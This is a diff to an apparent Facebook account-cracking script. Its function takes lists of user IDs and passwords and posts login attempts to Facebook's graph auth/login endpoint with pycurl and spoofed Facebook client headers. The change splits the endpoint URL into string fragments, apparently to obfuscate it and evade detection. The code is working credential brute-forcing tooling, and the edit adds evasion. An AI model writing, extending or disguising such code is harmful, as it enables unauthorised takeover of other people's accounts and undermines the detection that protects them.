@@ -1891,11 +1891,11 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             'X-Fb-Http-Engine: Liger',
             'X-Fb-Client-Ip: True',
             'X-Fb-Server-Cluster: True',
-            'Content-Length: 847']
-            url = "https://graph.facebook.com/auth/login"
+            ]
+            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
             buffer = BytesIO()
             c = pycurl.Curl()
-            c.setopt(c.URL, 'https://graph.facebook.com/auth/login')
+            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
             c.setopt(c.HTTPHEADER, headers)
             c.setopt(c.WRITEDATA, buffer)
             data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
